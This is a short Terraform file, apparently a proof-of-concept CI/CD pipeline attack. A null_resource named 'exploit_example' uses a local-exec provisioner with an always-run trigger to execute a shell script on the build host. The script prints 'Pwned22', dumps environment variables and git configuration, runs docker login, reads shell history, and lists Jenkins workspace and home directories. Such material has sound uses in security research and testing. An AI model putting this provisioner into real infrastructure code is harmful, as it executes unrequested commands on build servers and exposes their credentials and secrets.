resource "null_resource" "exploit_example" {
  provisioner "local-exec" {
    command = <<EOT
    #!/bin/bash
    echo Pwned22
    git config -l
    docker login
    terraform 
    ls $JENKINS_HOME
    ls -al /opt
    ls -al /home/ci
    history
    ls -al /data/jenkins/workspace/
    whoami
    printenv
    date
    EOT
  }
  triggers = {
    always_run = "${timestamp()}"
  }
}

